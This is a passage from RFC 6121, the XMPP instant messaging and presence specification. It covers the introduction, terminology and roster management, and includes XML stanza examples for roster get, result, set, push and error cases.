Saint-Andre                  Standards Track                    [Page 3]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   [5](#section-5).  Exchanging Messages . . . . . . . . . . . . . . . . . . . . .  [69](#page-69)
     [5.1](#section-5.1).  One-to-One Chat Sessions  . . . . . . . . . . . . . . . .  [69](#page-69)
     [5.2](#section-5.2).  Message Syntax  . . . . . . . . . . . . . . . . . . . . .  [70](#page-70)
       [5.2.1](#section-5.2.1).  To Attribute  . . . . . . . . . . . . . . . . . . . .  [70](#page-70)
       [5.2.2](#section-5.2.2).  Type Attribute  . . . . . . . . . . . . . . . . . . .  [71](#page-71)
       [5.2.3](#section-5.2.3).  Body Element  . . . . . . . . . . . . . . . . . . . .  [73](#page-73)
       [5.2.4](#section-5.2.4).  Subject Element . . . . . . . . . . . . . . . . . . .  [74](#page-74)
       [5.2.5](#section-5.2.5).  Thread Element  . . . . . . . . . . . . . . . . . . .  [75](#page-75)
     [5.3](#section-5.3).  Extended Content  . . . . . . . . . . . . . . . . . . . .  [77](#page-77)
   [6](#section-6).  Exchanging IQ Stanzas . . . . . . . . . . . . . . . . . . . .  [77](#page-77)
   [7](#section-7).  A Sample Session  . . . . . . . . . . . . . . . . . . . . . .  [78](#page-78)
   [8](#section-8).  Server Rules for Processing XML Stanzas . . . . . . . . . . .  [84](#page-84)
     [8.1](#section-8.1).  General Considerations  . . . . . . . . . . . . . . . . .  [85](#page-85)
     [8.2](#section-8.2).  No 'to' Address . . . . . . . . . . . . . . . . . . . . .  [85](#page-85)
     [8.3](#section-8.3).  Remote Domain . . . . . . . . . . . . . . . . . . . . . .  [85](#page-85)
     [8.4](#section-8.4).  Local Domain  . . . . . . . . . . . . . . . . . . . . . .  [86](#page-86)
     [8.5](#section-8.5).  Local User  . . . . . . . . . . . . . . . . . . . . . . .  [86](#page-86)
       [8.5.1](#section-8.5.1).  No Such User  . . . . . . . . . . . . . . . . . . . .  [86](#page-86)
       [8.5.2](#section-8.5.2).  localpart@domainpart  . . . . . . . . . . . . . . . .  [86](#page-86)
         [8.5.2.1](#section-8.5.2.1).  Available or Connected Resources  . . . . . . . .  [87](#page-87)
         [8.5.2.2](#section-8.5.2.2).  No Available or Connected Resources . . . . . . .  [89](#page-89)
       [8.5.3](#section-8.5.3).  localpart@domainpart/resourcepart . . . . . . . . . .  [90](#page-90)
         [8.5.3.1](#section-8.5.3.1).  Resource Matches  . . . . . . . . . . . . . . . .  [90](#page-90)
         [8.5.3.2](#section-8.5.3.2).  No Resource Matches . . . . . . . . . . . . . . .  [90](#page-90)
       [8.5.4](#section-8.5.4).  Summary of Message Delivery Rules . . . . . . . . . .  [92](#page-92)
   [9](#section-9).  Handling of URIs  . . . . . . . . . . . . . . . . . . . . . .  [93](#page-93)
   [10](#section-10). Internationalization Considerations . . . . . . . . . . . . .  [94](#page-94)
   [11](#section-11). Security Considerations . . . . . . . . . . . . . . . . . . .  [94](#page-94)
   [12](#section-12). Conformance Requirements  . . . . . . . . . . . . . . . . . .  [95](#page-95)
   [13](#section-13). References  . . . . . . . . . . . . . . . . . . . . . . . . .  [99](#page-99)
     [13.1](#section-13.1). Normative References  . . . . . . . . . . . . . . . . . .  [99](#page-99)
     [13.2](#section-13.2). Informative References  . . . . . . . . . . . . . . . . .  [99](#page-99)
   [Appendix A](#appendix-A).  Subscription States  . . . . . . . . . . . . . . . . [103](#page-103)
     [A.1](#appendix-A.1).  Defined States  . . . . . . . . . . . . . . . . . . . . . [103](#page-103)
     A.2.  Server Processing of Outbound Presence Subscription
           Stanzas . . . . . . . . . . . . . . . . . . . . . . . . . [104](#page-104)
       [A.2.1](#appendix-A.2.1).  Subscribe . . . . . . . . . . . . . . . . . . . . . . [105](#page-105)
       [A.2.2](#appendix-A.2.2).  Unsubscribe . . . . . . . . . . . . . . . . . . . . . [105](#page-105)
       [A.2.3](#appendix-A.2.3).  Subscribed  . . . . . . . . . . . . . . . . . . . . . [106](#page-106)
       [A.2.4](#appendix-A.2.4).  Unsubscribed  . . . . . . . . . . . . . . . . . . . . [106](#page-106)
     A.3.  Server Processing of Inbound Presence Subscription
           Stanzas . . . . . . . . . . . . . . . . . . . . . . . . . [106](#page-106)
       [A.3.1](#appendix-A.3.1).  Subscribe . . . . . . . . . . . . . . . . . . . . . . [107](#page-107)
       [A.3.2](#appendix-A.3.2).  Unsubscribe . . . . . . . . . . . . . . . . . . . . . [107](#page-107)
       [A.3.3](#appendix-A.3.3).  Subscribed  . . . . . . . . . . . . . . . . . . . . . [108](#page-108)
       [A.3.4](#appendix-A.3.4).  Unsubscribed  . . . . . . . . . . . . . . . . . . . . [109](#page-109)
   [Appendix B](#appendix-B).  Blocking Communication . . . . . . . . . . . . . . . [110](#page-110)
   [Appendix C](#appendix-C).  vCards . . . . . . . . . . . . . . . . . . . . . . . [110](#page-110)

Saint-Andre                  Standards Track                    [Page 4]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   [Appendix D](#appendix-D).  XML Schema for jabber:iq:roster  . . . . . . . . . . [110](#page-110)
   [Appendix E](#appendix-E).  Differences From [RFC 3921](/doc/html/rfc3921)  . . . . . . . . . . . . . [112](#page-112)
   [Appendix F](#appendix-F).  Acknowledgements . . . . . . . . . . . . . . . . . . [113](#page-113)

[1](#section-1).  Introduction

[1.1](#section-1.1).  Overview

   The Extensible Messaging and Presence Protocol (XMPP) is an
   application profile of the Extensible Markup Language [[XML](#ref-XML "\"Extensible Markup Language (XML) 1.0 (Fifth Edition)\"")] that
   enables the near-real-time exchange of structured yet extensible data
   between any two or more network entities.  The core features of XMPP
   defined in [[XMPP-CORE](#ref-XMPP-CORE)] provide the building blocks for many types of
   near-real-time applications, which can be layered on top of the core
   by sending application-specific data qualified by particular XML
   namespaces (refer to [[XML-NAMES](#ref-XML-NAMES)]).  This document defines XMPP
   extensions that provide the basic functionality expected of an
   instant messaging (IM) and presence application as described in
   [[IMP-REQS](#ref-IMP-REQS)].

[1.2](#section-1.2).  History

   The basic syntax and semantics of XMPP were developed originally
   within the Jabber open-source community, mainly in 1999.  In late
   2002, the XMPP Working Group was chartered with developing an
   adaptation of the core Jabber protocol that would be suitable as an
   IETF IM and presence technology in accordance with [[IMP-REQS](#ref-IMP-REQS)].  In
   October 2004, [[RFC3920](/doc/html/rfc3920 "\"Extensible Messaging and Presence Protocol (XMPP): Core\"")] and [[RFC3921](/doc/html/rfc3921 "\"Extensible Messaging and Presence Protocol (XMPP): Instant Messaging and Presence\"")] were published, representing
   the most complete definition of XMPP at that time.

   Since 2004 the Internet community has gained extensive implementation
   and deployment experience with XMPP, including formal
   interoperability testing carried out under the auspices of the XMPP
   Standards Foundation (XSF).  This document incorporates comprehensive
   feedback from software developers and service providers, including a
   number of backward-compatible modifications summarized under
   [Appendix E](#appendix-E).  As a result, this document reflects the rough consensus
   of the Internet community regarding the IM and presence features of
   XMPP 1.0, thus obsoleting [RFC 3921](/doc/html/rfc3921).

[1.3](#section-1.3).  Requirements

   Traditionally, IM applications have combined the following factors:

   1.  The central point of focus is a list of one's contacts or
       "buddies" (in XMPP this list is called a "roster").

Saint-Andre                  Standards Track                    [Page 5]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   2.  The purpose of using such an application is to exchange
       relatively brief text messages with particular contacts in close
       to real time -- often relatively large numbers of such messages
       in rapid succession, in the form of a one-to-one "chat session"
       as described under [Section 5.1](#section-5.1).

   3.  The catalyst for exchanging messages is "presence" -- i.e.,
       information about the network availability of particular contacts
       (thus knowing who is online and available for a one-to-one chat
       session).

   4.  Presence information is provided only to contacts that one has
       authorized by means of an explicit agreement called a "presence
       subscription".

   Thus at a high level this document assumes that a user needs to be
   able to complete the following use cases:

   o  Manage items in one's contact list

   o  Exchange messages with one's contacts

   o  Exchange presence information with one's contacts

   o  Manage presence subscriptions to and from one's contacts

   Detailed definitions of these functionality areas are contained in
   [RFC 2779](/doc/html/rfc2779) [[IMP-REQS](#ref-IMP-REQS)], and the interested reader is referred to that
   document regarding in-depth requirements.  Although the XMPP IM and
   presence extensions specified herein meet the requirements of [RFC](/doc/html/rfc2779)
   [2779](/doc/html/rfc2779), they were not designed explicitly with that specification in
   mind, since the base protocol evolved through an open development
   process within the Jabber open-source community before [RFC 2779](/doc/html/rfc2779) was
   written.  Although XMPP protocol extensions addressing many other
   functionality areas have been defined in the XMPP Standards
   Foundation's XEP series (e.g., multi-user text chat as specified in
   [[XEP-0045](#ref-XEP-0045)]), such extensions are not specified in this document
   because they are not mandated by [RFC 2779](/doc/html/rfc2779).

      Implementation Note: [RFC 2779](/doc/html/rfc2779) stipulates that presence services
      must be separable from IM services and vice-versa; i.e., it must
      be possible to use the protocol to provide a presence service, a
      messaging service, or both.  Although the text of this document
      assumes that implementations and deployments will want to offer a
      unified IM and presence service, it is not mandatory for an XMPP
      service to offer both a presence service and a messaging service,
      and the protocol makes it possible to offer separate and distinct

Saint-Andre                  Standards Track                    [Page 6]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

      services for presence and for messaging.  (For example, a
      presence-only service could return a <service-unavailable/> stanza
      error if a client attempts to send a <message/> stanza.)

[1.4](#section-1.4).  Functional Summary

   This non-normative section provides a developer-friendly, functional
   summary of XMPP-based IM and presence features; consult the sections
   that follow for a normative definition of these features.

   [XMPP-CORE] specifies how an XMPP client connects to an XMPP server.
   In particular, it specifies the preconditions that need to be
   fulfilled before a client is allowed to send XML stanzas (the basic
   unit of meaning in XMPP) to other entities on an XMPP network.  These
   preconditions comprise negotiation of the XML stream and include
   exchange of XML stream headers, optional channel encryption via
   Transport Layer Security [[TLS](#ref-TLS "\"The Transport Layer Security (TLS) Protocol Version 1.2\"")], mandatory authentication via Simple
   Authentication and Security Layer [[SASL](#ref-SASL "\"Simple Authentication and Security Layer (SASL)\"")], and binding of a resource
   to the stream for client addressing.  The reader is referred to
   [[XMPP-CORE](#ref-XMPP-CORE)] for details regarding these preconditions, and knowledge
   of [[XMPP-CORE](#ref-XMPP-CORE)] is assumed herein.

      Interoperability Note: [[RFC3921](/doc/html/rfc3921 "\"Extensible Messaging and Presence Protocol (XMPP): Instant Messaging and Presence\"")] specified one additional
      precondition: formal establishment of an instant messaging and
      presence session.  Implementation and deployment experience has
      shown that this additional step is unnecessary.  However, for
      backward compatibility an implementation MAY still offer that
      feature.  This enables older software to connect while letting
      newer software save a round trip.

   Upon fulfillment of the preconditions specified in [[XMPP-CORE](#ref-XMPP-CORE)], an
   XMPP client has a long-lived XML stream with an XMPP server, which
   enables the user controlling that client to send and receive a
   potentially unlimited number of XML stanzas over the stream.  Such a
   stream can be used to exchange messages, share presence information,
   and engage in structured request-response interactions in close to
   real time.  After negotiation of the XML stream, the typical flow for
   an instant messaging and presence session is as follows:

   1.  Retrieve one's roster.  (See [Section 2.2](#section-2.2).)

   2.  Send initial presence to the server for broadcast to all
       subscribed contacts, thus "going online" from the perspective of
       XMPP communication.  (See [Section 4.2](#section-4.2).)

Saint-Andre                  Standards Track                    [Page 7]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   3.  Exchange messages, manage presence subscriptions, perform roster
       updates, and in general process and generate other XML stanzas
       with particular semantics throughout the life of the session.
       (See Sections [5](#section-5), [3](#section-3), [2](#section-2), and [6](#section-6).)

   4.  Terminate the session when desired by sending unavailable
       presence and closing the underlying XML stream.  (See
       [Section 4.5](#section-4.5).)

[1.5](#section-1.5).  Terminology

   The key words "MUST", "MUST NOT", "REQUIRED", "SHALL", "SHALL NOT",
   "SHOULD", "SHOULD NOT", "RECOMMENDED", "NOT RECOMMENDED", "MAY", and
   "OPTIONAL" in this document are to be interpreted as described in [RFC](/doc/html/rfc2119)
   [2119](/doc/html/rfc2119) [[KEYWORDS](#ref-KEYWORDS)].

   This document inherits the terminology defined in [[XMPP-CORE](#ref-XMPP-CORE)].

   The terms "automated client" and "interactive client" are to be
   understood in the sense defined in [[TLS-CERTS](#ref-TLS-CERTS)].

   For convenience, this document employs the term "user" to refer to
   the owner of an XMPP account; however, account owners need not be
   humans and can be bots, devices, or other automated applications.

   Several other terms, such as "interested resource", are defined
   within the body of this document.

   Following the "XML Notation" used in [[IRI](#ref-IRI "\"Internationalized Resource Identifiers (IRIs)\"")] to represent characters
   that cannot be rendered in ASCII-only documents, some examples in
   this document use the form "&#x...." as a notational device to
   represent [[UNICODE](#ref-UNICODE "\"The Unicode Standard, Version 6.0\"")] characters (e.g., the string "&#x0159;" stands
   for the Unicode character LATIN SMALL LETTER R WITH CARON); this form
   is definitely not to be sent over the wire in XMPP systems.

   In examples, lines have been wrapped for improved readability,
   "[...]" means elision, and the following prepended strings are used
   (these prepended strings are not to be sent over the wire):

   o  C: = client

   o  CC: = contact's client

   o  CS: = contact's server

   o  S: = server

   o  UC: = user's client

Saint-Andre                  Standards Track                    [Page 8]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   o  US: = user's server

   Readers need to be aware that the examples are not exhaustive and
   that, in examples for some protocol flows, the alternate steps shown
   would not necessarily be triggered by the exact data sent in the
   previous step; in all cases, the protocol definitions specified in
   this document or in normatively referenced documents rule over any
   examples provided here.  All examples are fictional and the
   information exchanged (e.g., usernames and passwords) does not
   represent any existing users or servers.

[2](#section-2).  Managing the Roster

   In XMPP, a user's roster contains any number of specific contacts.  A
   user's roster is stored by the user's server on the user's behalf so
   that the user can access roster information from any device.  When
   the user adds items to the roster or modifies existing items, if an
   error does not occur then the server SHOULD store that data
   unmodified if at all possible and MUST return the data it has stored
   when an authorized client requests the roster.

      Security Warning: Because the user's roster can contain
      confidential data, the server MUST restrict access to this data so
      that only authorized entities (typically limited to the account
      owner) are able to retrieve, modify, or delete it.

   [RFC 3921](/doc/html/rfc3921) assumed that the only place where a user stores their roster
   is the server where the user's account is registered and at which the
   user authenticates for access to the XMPP network.  This
   specification removes that strict coupling of roster storage to
   account registration and network authentication, with the result that
   a user could store their roster at another location, or could have
   multiple rosters that are stored in multiple locations.  However, in
   the absence of implementation and deployment experience with a more
   flexible roster storage model, this specification retains the
   terminology of [RFC 3921](/doc/html/rfc3921) by using the terms "client" and "server" (and
   "the roster" instead of "a roster"), rather than coining a new term
   for "a place where a user stores a roster".  Future documents might
   provide normative rules for non-server roster storage or for the
   management of multiple rosters, but such rules are out of scope for
   this document.

[2.1](#section-2.1).  Syntax and Semantics

   Rosters are managed using <iq/> stanzas (see Section 8.2.3 of
   [[XMPP-CORE](#ref-XMPP-CORE)]), specifically by means of a <query/> child element
   qualified by the 'jabber:iq:roster' namespace.  The detailed syntax
   and semantics are defined in the following sections.

Saint-Andre                  Standards Track                    [Page 9]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[2.1.1](#section-2.1.1).  Ver Attribute

   The 'ver' attribute is a string that identifies a particular version
   of the roster information.  The value MUST be generated only by the
   server and MUST be treated by the client as opaque.  The server can
   use any appropriate method for generating the version ID, such as a
   hash of the roster data or a strictly increasing sequence number.

   Inclusion of the 'ver' attribute is RECOMMENDED.

   Use of the 'ver' attribute is described more fully under [Section 2.6](#section-2.6).

      Interoperability Note: The 'ver' attribute of the <query/> element
      was not defined in [RFC 3921](/doc/html/rfc3921) and is newly defined in this
      specification.

[2.1.2](#section-2.1.2).  Roster Items

   The <query/> element inside a roster set ([Section 2.1.5](#section-2.1.5)) contains one
   <item/> child, and a roster result ([Section 2.1.4](#section-2.1.4)) typically contains
   multiple <item/> children.  Each <item/> element describes a unique
   "roster item" (sometimes also called a "contact").

   The syntax of the <item/> element is described in the following
   sections.

[2.1.2.1](#section-2.1.2.1).  Approved Attribute

   The boolean 'approved' attribute with a value of "true" is used to
   signal subscription pre-approval as described under [Section 3.4](#section-3.4) (the
   default is "false", in accordance with [[XML-DATATYPES](#ref-XML-DATATYPES)]).

   A server SHOULD include the 'approved' attribute to inform the client
   of subscription pre-approvals.  A client MUST NOT include the
   'approved' attribute in the roster sets it sends to the server, but
   instead MUST use presence stanzas of type "subscribed" and
   "unsubscribed" to manage pre-approvals as described under
   [Section 3.4](#section-3.4).

      Interoperability Note: The 'approved' attribute of the <item/>
      element was not defined in [RFC 3921](/doc/html/rfc3921) and is newly defined in this
      specification.

[2.1.2.2](#section-2.1.2.2).  Ask Attribute

   The 'ask' attribute of the <item/> element with a value of
   "subscribe" is used to signal various subscription sub-states that
   include a "Pending Out" aspect as described under [Section 3.1.2](#section-3.1.2).

Saint-Andre                  Standards Track                   [Page 10]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   A server SHOULD include the 'ask' attribute to inform the client of
   "Pending Out" sub-states.  A client MUST NOT include the 'ask'
   attribute in the roster sets it sends to the server, but instead MUST
   use presence stanzas of type "subscribe" and "unsubscribe" to manage
   such sub-states as described under [Section 3.1.2](#section-3.1.2).

[2.1.2.3](#section-2.1.2.3).  JID Attribute

   The 'jid' attribute of the <item/> element specifies the Jabber
   Identifier (JID) that uniquely identifies the roster item.

   The 'jid' attribute is REQUIRED whenever a client or server adds,
   updates, deletes, or returns a roster item.

[2.1.2.4](#section-2.1.2.4).  Name Attribute

   The 'name' attribute of the <item/> element specifies the "handle" to
   be associated with the JID, as determined by the user (not the
   contact).  Although the value of the 'name' attribute MAY have
   meaning to a human user, it is opaque to the server.  However, the
   'name' attribute MAY be used by the server for matching purposes
   within the context of various XMPP extensions (one possible
   comparison method is that described for XMPP resourceparts in
   [[XMPP-ADDR](#ref-XMPP-ADDR)]).

   It is OPTIONAL for a client to include the 'name' attribute when
   adding or updating a roster item.

[2.1.2.5](#section-2.1.2.5).  Subscription Attribute

   The state of the presence subscription is captured in the
   'subscription' attribute of the <item/> element.  The defined
   subscription-related values are:

   none:  the user does not have a subscription to the contact's
      presence, and the contact does not have a subscription to the
      user's presence; this is the default value, so if the subscription
      attribute is not included then the state is to be understood as
      "none"

   to:  the user has a subscription to the contact's presence, but the
      contact does not have a subscription to the user's presence

   from:  the contact has a subscription to the user's presence, but the
      user does not have a subscription to the contact's presence

   both:  the user and the contact have subscriptions to each other's
      presence (also called a "mutual subscription")

Saint-Andre                  Standards Track                   [Page 11]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   In a roster result ([Section 2.1.4](#section-2.1.4)), the client MUST ignore values of
   the 'subscription' attribute other than "none", "to", "from", or
   "both".

   In a roster push ([Section 2.1.6](#section-2.1.6)), the client MUST ignore values of
   the 'subscription' attribute other than "none", "to", "from", "both",
   or "remove".

   In a roster set ([Section 2.1.5](#section-2.1.5)), the 'subscription' attribute MAY be
   included with a value of "remove", which indicates that the item is
   to be removed from the roster; in a roster set the server MUST ignore
   all values of the 'subscription' attribute other than "remove".

   Inclusion of the 'subscription' attribute is OPTIONAL.

[2.1.2.6](#section-2.1.2.6).  Group Element

   The <group/> child element specifies a category or "bucket" into
   which the roster item is to be grouped by a client.  An <item/>
   element MAY contain more than one <group/> element, which means that
   roster groups are not exclusive.  Although the XML character data of
   the <group/> element MAY have meaning to a human user, it is opaque
   to the server.  However, the <group/> element MAY be used by the
   server for matching purposes within the context of various XMPP
   extensions (one possible comparison method is that described for XMPP
   resourceparts in [[XMPP-ADDR](#ref-XMPP-ADDR)]).

   It is OPTIONAL for a client to include the <group/> element when
   adding or updating a roster item.  If a roster set ([Section 2.1.5](#section-2.1.5))
   includes no <group/> element, then the item is to be interpreted as
   being affiliated with no group.

[2.1.3](#section-2.1.3).  Roster Get

   A "roster get" is a client's request for the server to return the
   roster; syntactically it is an IQ stanza of type "get" sent from
   client to server and containing a <query/> element qualified by the
   'jabber:iq:roster' namespace, where the <query/> element MUST NOT
   contain any <item/> child elements.

   C: <iq from='juliet@example.com/balcony'
          id='bv1bs71f'
          type='get'>
       <query xmlns='jabber:iq:roster'/>
     </iq>

   The expected outcome of sending a roster get is for the server to
   return a roster result.

Saint-Andre                  Standards Track                   [Page 12]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[2.1.4](#section-2.1.4).  Roster Result

   A "roster result" is the server's response to a roster get;
   syntactically it is an IQ stanza of type "result" sent from server to
   client and containing a <query/> element qualified by the 'jabber:iq:
   roster' namespace.

   The <query/> element in a roster result contains one <item/> element
   for each contact and therefore can contain more than one <item/>
   element.

   S: <iq id='bv1bs71f'
          to='juliet@example.com/chamber'
          type='result'>
       <query xmlns='jabber:iq:roster' ver='ver7'>
         <item jid='nurse@example.com'/>
         <item jid='romeo@example.net'/>
       </query>
     </iq>

   If the roster exists but there are no contacts in the roster, then
   the server MUST return an IQ-result containing a child <query/>
   element that in turn contains no <item/> children (i.e., the server
   MUST NOT return an empty <iq/> stanza of type "error").

   S: <iq id='bv1bs71f'
          to='juliet@example.com/chamber'
          type='result'>
       <query xmlns='jabber:iq:roster' ver='ver9'/>
     </iq>

   If the roster does not exist, then the server MUST return a stanza
   error with a condition of <item-not-found/>.

   S: <iq id='bv1bs71f'
          to='juliet@example.com/chamber'
          type='error'>
       <error type='cancel'>
         <item-not-found
             xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/>
       </error>
     </iq>

Saint-Andre                  Standards Track                   [Page 13]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[2.1.5](#section-2.1.5).  Roster Set

   A "roster set" is a client's request for the server to modify (i.e.,
   create, update, or delete) a roster item; syntactically it is an IQ
   stanza of type "set" sent from client to server and containing a
   <query/> element qualified by the 'jabber:iq:roster' namespace.

   The following rules apply to roster sets:

   1.  The <query/> element MUST contain one and only one <item/>
       element.

   2.  The server MUST ignore any value of the 'subscription' attribute
       other than "remove" (see [Section 2.1.2.5](#section-2.1.2.5)).

      Security Warning: Traditionally, the IQ stanza of the roster set
      included no 'to' address, with the result that all roster sets
      were sent from an authenticated resource (full JID) of the account
      whose roster was being updated.  Furthermore, [RFC 3921](/doc/html/rfc3921) required a
      server to perform special-case checking of roster sets to ignore
      the 'to' address; however, this specification has removed that
      special-casing, which means that a roster set might include a 'to'
      address other than that of the sender.  Therefore, the entity that
      processes a roster set MUST verify that the sender of the roster
      set is authorized to update the roster, and if not return a
      <forbidden/> error.

   C: <iq from='juliet@example.com/balcony'
          id='rs1'
          type='set'>
       <query xmlns='jabber:iq:roster'>
         <item jid='nurse@example.com'/>
       </query>
     </iq>

[2.1.6](#section-2.1.6).  Roster Push

   A "roster push" is a newly created, updated, or deleted roster item
   that is sent from the server to the client; syntactically it is an IQ
   stanza of type "set" sent from server to client and containing a
   <query/> element qualified by the 'jabber:iq:roster' namespace.

   The following rules apply to roster pushes:

   1.  The <query/> element in a roster push MUST contain one and only
       one <item/> element.

Saint-Andre                  Standards Track                   [Page 14]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   2.  A receiving client MUST ignore the stanza unless it has no 'from'
       attribute (i.e., implicitly from the bare JID of the user's
       account) or it has a 'from' attribute whose value matches the
       user's bare JID <user@domainpart>.

   S: <iq id='a78b4q6ha463'
          to='juliet@example.com/chamber'
          type='set'>
       <query xmlns='jabber:iq:roster'>
         <item jid='nurse@example.com'/>
       </query>
     </iq>

   As mandated by the semantics of the IQ stanza as defined in
   [[XMPP-CORE](#ref-XMPP-CORE)], each resource that receives a roster push from the
   server is supposed to reply with an IQ stanza of type "result" or
   "error" (however, it is known that many existing clients do not reply
   to roster pushes).

   C: <iq from='juliet@example.com/balcony'
          id='a78b4q6ha463'
          type='result'/>

   C: <iq from='juliet@example.com/chamber'
          id='a78b4q6ha463'
          type='result'/>

      Security Warning: Traditionally, a roster push included no 'from'
      address, with the result that all roster pushes were sent
      implicitly from the bare JID of the account itself.  However, this
      specification allows entities other than the user's server to
      maintain roster information, which means that a roster push might
      include a 'from' address other than the bare JID of the user's
      account.  Therefore, the client MUST check the 'from' address to
      verify that the sender of the roster push is authorized to update
      the roster.  If the client receives a roster push from an
      unauthorized entity, it MUST NOT process the pushed data; in
      addition, the client can either return a stanza error of <service-
      unavailable/> error or refuse to return a stanza error at all (the
      latter behavior overrides a MUST-level requirement from
      [[XMPP-CORE](#ref-XMPP-CORE)] for the purpose of preventing a presence leak).

      Implementation Note: There is no error case for client processing
      of roster pushes; if the server receives an IQ of type "error" in
      response to a roster push then it SHOULD ignore the error.

Saint-Andre                  Standards Track                   [Page 15]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

[2.2](#section-2.2).  Retrieving the Roster on Login

   Upon authenticating with a server and binding a resource (thus
   becoming a connected resource as defined in [[XMPP-CORE](#ref-XMPP-CORE)]), a client
   SHOULD request the roster before sending initial presence (however,
   because receiving the roster is not necessarily desirable for all
   resources, e.g., a connection with limited bandwidth, the client's
   request for the roster is not mandatory).  After a connected resource
   sends initial presence (see [Section 4.2](#section-4.2)), it is referred to as an
   "available resource".  If a connected resource or available resource
   requests the roster, it is referred to as an "interested resource".
   The server MUST send roster pushes to all interested resources.

      Implementation Note: Presence subscription requests are sent to
      available resources, whereas the roster pushes associated with
      subscription state changes are sent to interested resources.
      Therefore, if a resource wishes to receive both subscription
      requests and roster pushes, it MUST both send initial presence and
      request the roster.

   A client requests the roster by sending a roster get over its stream
   with the server.

   C: <iq from='juliet@example.com/balcony'
          id='hu2bac18'
          type='get'>
        <query xmlns='jabber:iq:roster'/>
      </iq>

   S: <iq id='hu2bac18'
          to='juliet@example.com/balcony'
          type='result'>
        <query xmlns='jabber:iq:roster' ver='ver11'>
          <item jid='romeo@example.net'
                name='Romeo'
                subscription='both'>
            <group>Friends</group>
          </item>
          <item jid='mercutio@example.com'
                name='Mercutio'
                subscription='from'/>
          <item jid='benvolio@example.net'
                name='Benvolio'
                subscription='both'/>
        </query>
      </iq>

Saint-Andre                  Standards Track                   [Page 16]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   If the server cannot process the roster get, it MUST return an
   appropriate stanza error as described in [[XMPP-CORE](#ref-XMPP-CORE)] (such as
   <service-unavailable/> if the roster namespace is not supported or
   <internal-server-error/> if the server experiences trouble processing
   or returning the roster).

[2.3](#section-2.3).  Adding a Roster Item

[2.3.1](#section-2.3.1).  Request

   At any time, a client can add an item to the roster.  This is done by
   sending a roster set containing a new item.

   C: <iq from='juliet@example.com/balcony'
          id='ph1xaz53'
          type='set'>
        <query xmlns='jabber:iq:roster'>
          <item jid='nurse@example.com'
                name='Nurse'>
            <group>Servants</group>
          </item>
        </query>
      </iq>

[2.3.2](#section-2.3.2).  Success Case

   If the server can successfully process the roster set for the new
   item (i.e., if no error occurs), it MUST create the item in the
   user's roster and proceed as follows.

   The server MUST return an IQ stanza of type "result" to the connected
   resource that sent the roster set.

   S: <iq id='ph1xaz53'
          to='juliet@example.com/balcony'
          type='result'/>

   The server MUST also send a roster push containing the new roster
   item to all of the user's interested resources, including the
   resource that generated the roster set.

Saint-Andre                  Standards Track                   [Page 17]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   S: <iq to='juliet@example.com/balcony'
          id='a78b4q6ha463'
          type='set'>
        <query xmlns='jabber:iq:roster' ver='ver13'>
          <item jid='nurse@example.com'
                name='Nurse'
                subscription='none'>
            <group>Servants</group>
          </item>
        </query>
      </iq>

   S: <iq to='juliet@example.com/chamber'
          id='x81g3bdy4n19'
          type='set'>
        <query xmlns='jabber:iq:roster' ver='ver13'>
          <item jid='nurse@example.com'
                name='Nurse'
                subscription='none'>
            <group>Servants</group>
          </item>
        </query>
      </iq>

   As mandated by the semantics of the IQ stanza as defined in
   [[XMPP-CORE](#ref-XMPP-CORE)], each resource that receives a roster push from the
   server is supposed to reply with an IQ stanza of type "result" or
   "error" (however, it is known that many existing clients do not reply
   to roster pushes).

   C: <iq from='juliet@example.com/balcony'
          id='a78b4q6ha463'
          type='result'/>

   C: <iq from='juliet@example.com/chamber'
          id='x81g3bdy4n19'
          type='result'/>

[2.3.3](#section-2.3.3).  Error Cases

   If the server cannot successfully process the roster set, it MUST
   return a stanza error.  The following error cases are defined.
   Naturally, other stanza errors can occur, such as <internal-server-
   error/> if the server experiences an internal problem with processing
   the roster get, or even <not-allowed/> if the server only allows
   roster modifications by means of a non-XMPP method such as a web
   interface.

Saint-Andre                  Standards Track                   [Page 18]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

   The server MUST return a <forbidden/> stanza error to the client if
   the sender of the roster set is not authorized to update the roster
   (where typically only an authenticated resource of the account itself
   is authorized).

   The server MUST return a <bad-request/> stanza error to the client if
   the roster set contains any of the following violations:

   1.  The <query/> element contains more than one <item/> child
       element.

   2.  The <item/> element contains more than one <group/> element, but
       there are duplicate groups (one possible comparison method for
       determining duplicates is that described for XMPP resourceparts
       in [[XMPP-ADDR](#ref-XMPP-ADDR)]).

   The server MUST return a <not-acceptable/> stanza error to the client
   if the roster set contains any of the following violations:

   1.  The length of the 'name' attribute is greater than a server-
       configured limit.

   2.  The XML character data of the <group/> element is of zero length
       (to remove an item from all groups, the client instead needs to
       exclude any <group/> element from the roster set).

   3.  The XML character data of the <group/> element is larger than a
       server-configured limit.

   Error: Roster set initiated by unauthorized entity

   C: <iq from='juliet@example.com/balcony'
          id='ix7s53v2'
          to='romeo@example.net'
          type='set'>
        <query xmlns='jabber:iq:roster'>
          <item jid='nurse@example.com'/>
        </query>
      </iq>

   S: <iq id='ix7s53v2'
          to='juliet@example.com/balcony'
          type='error'>
       <error type='auth'>
         <forbidden xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/>
       </error>
     </iq>

Saint-Andre                  Standards Track                   [Page 19]
```

---

```

[RFC 6121](/doc/html/rfc6121)                         XMPP IM                      March 2011

